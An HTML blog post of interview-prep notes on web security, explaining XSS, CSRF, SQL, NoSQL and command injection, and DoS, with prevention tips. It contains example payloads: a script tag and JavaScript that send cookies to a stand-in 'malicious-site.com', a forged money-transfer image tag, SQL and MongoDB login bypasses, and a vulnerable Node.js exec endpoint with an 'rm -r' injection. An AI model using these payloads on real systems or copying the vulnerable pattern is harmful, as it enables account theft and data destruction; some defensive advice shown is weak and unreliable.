<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<title>Bert's Blog</title>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/github-markdown-css/4.0.0/github-markdown.min.css" integrity="sha512-Oy18vBnbSJkXTndr2n6lDMO5NN31UljR8e/ICzVPrGpSud4Gkckb8yUpqhKuUNoE+o9gAb4O/rAxxw1ojyUVzg==" crossorigin="anonymous" />
	<link rel="stylesheet/less" type="text/css" href="/blog/style.less" />
	<script src="//cdn.jsdelivr.net/npm/less@3.13" ></script>
	<style>
		.markdown-body {
			box-sizing: border-box;
			min-width: 200px;
			max-width: 980px;
			margin: 0 auto;
			padding: 45px;
		}
	
		@media (max-width: 767px) {
			.markdown-body {
				padding: 15px;
			}
		}
	</style>
</head>

<body>
	<div><div><article class="markdown-body"><p>When I was in an interview of Tencent, the interviewer asked me how much Web security points you know?</p>
<p>I found I don&#39;t have a systemic knowledge network about it.</p>
<p>So, there are some points I collected for memory.</p>
<h2 id="xss">XSS</h2>
<p>Its full name is Cross Site Script. But its abbreviation is CSS, which is the same as Cascading 
Style Sheets. SO....it becomes XSS. </p>
<p>XSS is a code injection attack that allows an attacker to execute malicious 
JavaScript in another user&#39;s browser.</p>
<p>It includes these 3 types:</p>
<h3 id="persistent-xss">Persistent XSS</h3>
<p>Normally happened in those websites users can post their input. The malicious code will be saved in 
the database, therefore, each user who opened the page will be attacked.</p>
<p>For example, if there is a input tag, user can post their own content by it. Other users can open this page see 
the content.</p>
<pre><code class="language-html">&lt;!--the content in this tag will be post to database--&gt;
&lt;input type=&quot;text&quot;&gt; 

&lt;!--if a user input &quot;Users content&quot;, other user can see as below--&gt;
&lt;p&gt;Users content&lt;/p&gt;
</code></pre>
<p>But, if someone input a string as below:</p>
<pre><code class="language-html">&lt;script src=&quot;http://www.malicious-site.com/code&quot;&gt;&lt;/script&gt;
</code></pre>
<p>the final result may as:</p>
<pre><code class="language-html">&lt;p&gt;&lt;script src=&quot;http://www.malicious-site.com/code&quot;&gt;&lt;/script&gt;&lt;/p&gt;
</code></pre>
<p>And the script like as below:</p>
<pre><code class="language-js">var img = document.createElement(&#39;img&#39;);
img.src = &#39;http://www.malicious-site.com/save-cookie?cookie=&#39; + document.cookie;
document.body.appendChild(img);
</code></pre>
<p>In this way, the malicious site can get the cookie of each user who open the page.</p>
<p>To prevent it, I think the best way is to filter users&#39; post content.</p>
<h3 id="reflected-xss">Reflected XSS</h3>
<p>Its principle is the same as Persistent XSS, attacker try to get user&#39;s personal information 
by insert HTML tag.</p>
<p>For example, there is a error page who shows error messages from the server by url, like </p>
<p><code>http://www.some-page.com/error?message=Page%20not%20found</code></p>
<p>the content in <code>message</code> will be showed in HTML, like:</p>
<pre><code class="language-html">&lt;p&gt;Page not found&lt;/p&gt;
</code></pre>
<p>If an attack inputs an URL like </p>
<p><code>http://www.some-page.com/error?message=&lt;script src=&quot;http://www.malicious-site.com/code&quot;&gt;&lt;/script&gt;</code></p>
<p>The final HTML will become:</p>
<pre><code class="language-html">&lt;p&gt;&lt;script src=&quot;http://www.malicious-site.com/code&quot;&gt;&lt;/script&gt;&lt;/p&gt;
</code></pre>
<p>Next processes will be the same as Persistent XSS.</p>
<h3 id="dom-based-xss">DOM-based XSS</h3>
<p>According to some of articles on the Internet, Dom-based XSS is a special Reflected XSS.</p>
<p>In my understanding, DOM-based XSS triggers attack via modifying DOM content, such as 
<code>innerHTML</code>, which is the same as Reflected XSS. </p>
<p>But, their difference is that Dom-based XSS won&#39;t leave a mark in the server side, compared to Reflected XSS
which will leave a url record in the server request log.</p>
<p>There is a simple example updated from last example of Reflected XSS:</p>
<p>we can use a new url like:</p>
<p><code>http://www.some-page.com/error?message=Page%20not%20found#%3Cscript%20src%3D%22http%3A%2F%2Fwww.malicious-site.com%2Fcode%22%3E%3C%2Fscript%3E</code></p>
<p>The biggest difference is that we can use <code>location.hash</code> to inject malicious code to the page, which won&#39;t show the url after <code>#</code> in the 
server side. In this way, it is more difficult for website maintainers to find the attack by checking request log.</p>
<p>So the biggest difference among Reflected XSS and DOM-based XSS is that DOM-based XSS cannot be found in the server side, it is 
pure attack happened on client side.</p>
<h3 id="how-to-prevent-xss">How to prevent XSS</h3>
<p>I think the best way to prevent XSS is to forbid users to change HTML content, but this is difficult especially for those websites 
based on UGC. </p>
<p>So, the feasible way is to filter url&#39;s parameters and UGC, such as some of special chars, <code>&lt;&gt;\/*;&#39;</code>.</p>
<p>There are some alternative chars to replace sensitive chars in JS, such as <code>\u003c</code> and <code>\x3c</code> to replace <code>&lt;</code>, and <code>\u003e</code> and <code>\x3e</code> to 
replace <code>&gt;</code>.</p>
<h2 id="csrf">CSRF</h2>
<p>Its full name is Cross Site Request Forgery, abbreviation is CSRF. </p>
<p>Like XSS, it may steal users&#39; cookie.</p>
<p>But their difference is that XSS is to make use of the trust for users, CSRF is to pretend as the user.</p>
<p>For example, there is a request </p>
<p><code>http://www.money.com?account=sender&amp;amount=10000&amp;for=receiver</code> </p>
<p>to transfer money while the user was already logined and cookie was saved. If the user go to a malicious website which add a tag like </p>
<pre><code class="language-html">&lt;img src=&#39;http://www.money.com?account=sender&amp;amount=10000&amp;for=hacker&#39;&gt;
</code></pre>
<p>the cookie will be with this request because of same domain.</p>
<p>In this way, the hacker does not need to get the user&#39;s cookie when attacking.</p>
<p>There are some ways to protect:</p>
<h3 id="check-http-referer">Check HTTP Referer</h3>
<p>The most simple way is to check HTTP Referer, which can identify the original website of 
the request. </p>
<p>In Node.JS, for example:</p>
<pre><code class="language-js">app.use(req =&gt; {
    if (req.headers.referer === &#39;http://legal-site.com&#39;){
        //do something
    } else {
        //reject request
    }
});
</code></pre>
<p>But, in some of old version chrome, such as IE6 or FF2, there are ways to artificially modify 
HTTP Referer. Besides, users may forbid browser to offer HTTP Referer.</p>
<h3 id="token">Token</h3>
<p>CSRF is to forge normal real user request. So, if we can use create a token that the attacker cannot 
get, we can avoid CSRF.</p>
<p>For example, we can calculate post message&#39;s hash value in front side, and set it in the url or http header,
when server is processing the request, it can check the token, if the token is not right, refuse to response.</p>
<h2 id="injection-attack">Injection Attack</h2>
<p>Injection attacks refer to a broad class of attack vectors. In an injection attack, an attacker supplies untrusted 
input to a program. This input gets processed by an interpreter as part of a command or query. In turn, this alters 
the execution of that program.</p>
<p>It includes some of typical types as below:</p>
<h3 id="sql-injection">SQL Injection</h3>
<p>SQL Injection may execute malicious SQL statements in the database, such as getting whole data of the table or specific 
user information. </p>
<h4 id="number-injection">Number Injection</h4>
<p>For example, if there is a API to GET user&#39;s information: <code>www.example.com?id=1</code>, 
the SQL statement may be:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE id=1
</code></pre>
<p>When we input <code>www.example.com?id=1 OR 1=1</code>, , the statement will become </p>
<pre><code class="language-sql">SELECT * FROM Users WHERE id=1 OR 1=1
</code></pre>
<p>As a result, attacker can get whole table information. </p>
<h4 id="string-injection">String Injection</h4>
<p>Or, if there is a API for POST to login, the parameters include username and password. The SQL statement may like </p>
<pre><code class="language-sql">SELECT * FROM users WHERE username=&#39;user&#39; AND password=&#39;password&#39;
</code></pre>
<p>Attacker may try to make the part of statement after username become comments to directly get users&#39; information without password.</p>
<p>For example, if the user input is <code>user&#39; # </code> and password as <code>password&#39;</code>, the final statement will become:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username=&#39;user&#39; # &#39; AND password=&#39;password&#39;&#39;
</code></pre>
<p>Similarly, input user as <code>user&#39; -- </code> also work as:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username=&#39;user&#39; -- &#39; AND password=&#39;password&#39;
</code></pre>
<p>These two statements are both the same as:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username=&#39;user&#39;
</code></pre>
<h3 id="nosql-injection">NoSQL Injection</h3>
<p>Like SQL, NoSQL database like MongoDB can also be injected.</p>
<p>Like the same example in SQL Injection, if the application uses NoSQL database such as Mongodb, 
the statement may be:</p>
<pre><code>db.users.find({username:user, password=password})
</code></pre>
<p>If someone&#39;s JSON input object likes:</p>
<pre><code>{
  &quot;username&quot;: &quot;user&quot;,
  &quot;password&quot;: {$gt: &quot;&quot;}
}
</code></pre>
<p>In MongoDB, <code>$gt</code> selects those documents where the value of the field is greater than (i.e. &gt;) the specified value. 
Thus above statement compares password in database with empty string for greatness, which returns true.</p>
<p>The same results can be achieved using other comparison operator such as $ne.</p>
<h3 id="command-injection">Command Injection</h3>
<p>Like SQL Injection and NoSQL Injection, Command Injection will also run malicious code because of a user&#39;s input. </p>
<p>For example, if there is an API allows users to compress specific file in the server:</p>
<pre><code class="language-js">app.use.get(&#39;/gzip&#39;, (req, res)=&gt;{
    child_process.exec(`exec ${req.query.file_path}`, (err, data)=&gt;{
        if (err){
            res.send(err.toString());
        } else {
            res.send(data.toString());
        }
    })
});
</code></pre>
<p>If some one input an URL like: </p>
<p><code>www.example.com/gzip?file_path=file.txt\rm -r ./*</code></p>
<p>It may be a disaster.</p>
<h3 id="how-to-prevent">How to prevent</h3>
<p>There are some tips:</p>
<ol>
<li><p>use prepared statements instead of building dynamic queries using string concatenation.</p>
</li>
<li><p>Validate inputs to detect malicious values.</p>
</li>
<li><p>To minimize the potential damage of a successful injection attack, do not assign DBA or admin type access rights 
to your application accounts. Similarly minimize the privileges of the operating system account that the database process runs under.</p>
</li>
</ol>
<h2 id="dos-attack">DoS Attack</h2>
<p>In computing, a denial-of-service attack (DoS attack) is a cyber-attack in which the perpetrator seeks to make a machine 
or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet.</p>
<p>includes:</p>
<ol>
<li><p>SYN Flood</p>
</li>
<li><p>ICMP Flood</p>
</li>
<li><p>UDP Flood</p>
</li>
</ol>
<p>Compared to DoS attack, A distributed denial-of-service (DDoS) attack occurs when multiple systems flood the bandwidth 
or resources of a targeted system, usually one or more web servers. Such an attack is often the result of multiple 
compromised systems (for example, a botnet) flooding the targeted system with traffic.</p>
</article></div></div>
</body>

</html>